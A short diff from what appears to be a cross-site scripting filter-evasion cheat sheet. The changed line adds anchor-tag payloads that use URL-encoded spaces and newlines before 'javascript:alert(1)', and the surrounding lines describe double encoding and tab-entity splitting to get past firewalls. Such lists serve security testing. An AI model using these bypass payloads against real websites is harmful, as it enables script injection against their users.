@@ -69,7 +69,7 @@ Try New Lines to break the firewall - newline URL encoded is %0 - <.script>%0ale
  <br>
 Try double encoding a newline break %2522 <br> 
  <br>
-New Line breaks often work on <.a/href=%2522javascript:alert(1)> <br>
+New Line breaks often work on <.a/href=%2520javascript:alert(1)>  <.a/href=%20javascript:alert(1)> <.a/href=javascript:%20alert(1)><br>
  <br>
 Injecting anchor tag without whitespaces -breaking up characters with decoded value of %26Tab%3B (url decode character) between each character<br>
  <br>
